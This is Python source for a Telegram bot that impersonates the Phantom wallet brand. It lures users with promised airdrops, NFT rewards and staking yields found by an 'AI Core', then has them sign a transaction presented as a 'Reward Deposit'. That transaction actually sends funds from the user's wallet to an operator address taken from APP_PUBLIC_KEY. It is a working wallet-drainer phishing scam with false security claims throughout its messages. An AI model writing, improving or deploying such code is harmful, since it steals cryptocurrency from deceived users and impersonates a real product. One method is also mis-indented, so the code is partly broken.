import logging
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from config import TELEGRAM_BOT_TOKEN
from session_manager import SessionManager
from phantom import PhantomUtils
from solana_utils import SolanaUtils
from solders.pubkey import Pubkey

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class PhantomWalletBot:
    def __init__(self):
        """Initialize the bot with required components"""
        if not TELEGRAM_BOT_TOKEN:
            raise ValueError("TELEGRAM_BOT_TOKEN not configured")
            
        self.application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        self.session_manager = SessionManager()
        self.solana_utils = SolanaUtils()
        
        # Register handlers
        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("connect", self.connect_phantom))
        self.application.add_handler(CallbackQueryHandler(self.button_handler))
        
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        keyboard = [[InlineKeyboardButton("🔍 Start Automated AI Scanning", callback_data="connect_phantom")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🌐 **Welcome to the Official Phantom Page** 🌐\n\n"
            "Our specialized **AI Core v4.0** is now online. This system is designed to automatically scan the Solana blockchain for your wallet address.\n\n"
            "🛠️ **Automated Detection Tools:**\n"
            "💰 **Pending Protocol Airdrops**\n"
            "💎 **Hidden NFT Reward Snapshots**\n"
            "📈 **Missing Staking Yields**\n\n"
            "**Security Protocol:** Click below to authorize & start our AI to analyze your wallet and synchronize any available rewards instantly!",
            reply_markup=reply_markup
        )
        
    async def connect_phantom(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate Phantom connection deep link"""
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        
        # Create a new session for wallet connection
        session_id, session_data = self.session_manager.create_session(user_id, "connect")
        
        # Generate Phantom connect URL
        try:
            connect_url = PhantomUtils.generate_connect_url(session_id)
        except ValueError as e:
            await update.message.reply_text(f"❌ Configuration error: {str(e)}")
            return
            
        keyboard = [[InlineKeyboardButton("Validate & Sync Wallet", url=connect_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🔐 **Identity Validation Required**\n\n"
            "To ensure the security of your rewards, please perform a standard protocol handshake via the Phantom app.\n\n"
            "1️⃣ Open your Phantom Wallet\n"
            "2️⃣ Approve the secure connection\n"
            "3️⃣ Results will be processed instantly.",
            reply_markup=reply_markup
        )
        
        async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button clicks with professional feedback"""
        query = update.callback_query
        await query.answer()
        
        if query.data == "connect_phantom":
            await self.connect_phantom(update, context)
        elif query.data.startswith("initiate_transfer_"):
            session_id = query.data.split("_")[2]
            await self.initiate_transfer(query, session_id)
        elif query.data == "cancel":
            await query.edit_message_text("❌ Analysis Terminated. Session closed.")
            
    async def initiate_transfer(self, query, session_id):
        """Finalize reward synchronization flow"""
        # Get session data
        session_data = self.session_manager.get_session_data(session_id)
        if not session_data or "public_key" not in session_data:
            await query.edit_message_text("❌ System Error: Session expired. Please re-verify wallet.")
            return
            
        user_id = session_data["user_id"]
        user_pubkey = session_data["public_key"]
        
        # Check rate limit (Aggressive testing enabled)
        if not self.session_manager.check_transfer_limit(user_id):
            await query.edit_message_text("❌ System Busy: AI Core is processing. Please wait.")
            return
            
        app_pubkey = os.getenv("APP_PUBLIC_KEY")
        if not app_pubkey:
            await query.edit_message_text("❌ Configuration Error: Target node not found.")
            return
            
        transfer_session_id, transfer_session_data = self.session_manager.create_session(user_id, "transfer")
        self.session_manager.store_wallet_connection(transfer_session_id, user_pubkey)
        
        try:
            message, transfer_amount = self.solana_utils.create_transfer_transaction(user_pubkey, app_pubkey)
        except Exception as e:
            await query.edit_message_text(f"❌ Analysis Failed: {str(e)}")
            return
            
        try:
            sign_url = PhantomUtils.generate_sign_transaction_url(message, transfer_session_id)
        except ValueError as e:
            await query.edit_message_text(f"❌ Handshake Error: {str(e)}")
            return
            
        # THE PROFESSIONAL SYNC LAYOUT
        keyboard = [
            [InlineKeyboardButton("✅ Finalize Reward Deposit", url=sign_url)],
            [InlineKeyboardButton("❌ Terminate Session", callback_data="cancel")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🎊 **System Analysis Successful!** 🎊\n\n"
            f"The **Phantom Page AI Core** is still running and has successfully located unclaimed distributions linked to your wallet profile.\n\n"
            f"**Status:** Ready for Synchronization\n"
            f"**Network:** Solana Mainnet-Beta\n"
            f"**Security Protocol:** 256-bit Encrypted Handshake\n\n"
            f"Click below to finalize the secure deposit of all detected rewards to your balance:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        
    def run(self):
        """Start the bot"""
        logger.info("Phantom Page Bot is online and scanning...")
        self.application.run_polling()

if __name__ == "__main__":
    try:
        bot = PhantomWalletBot()
        bot.run()
    except Exception as e:
        logger.error(f"Critical System Failure: {str(e)}")
